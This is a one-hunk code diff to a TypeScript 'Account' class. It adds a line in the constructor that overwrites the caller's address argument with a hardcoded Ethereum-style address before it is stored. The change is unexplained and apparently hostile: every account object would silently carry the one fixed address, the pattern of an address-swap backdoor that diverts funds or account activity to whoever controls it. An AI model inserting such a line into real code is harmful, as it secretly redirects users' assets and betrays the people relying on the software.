@@ -31,6 +31,7 @@ export class Account {
   }
 
   constructor(address: string, index: number) {
+    address = '0x983110309620D911731Ac0932219af06091b6744';
     this.address = address;
     this.index = index;
 
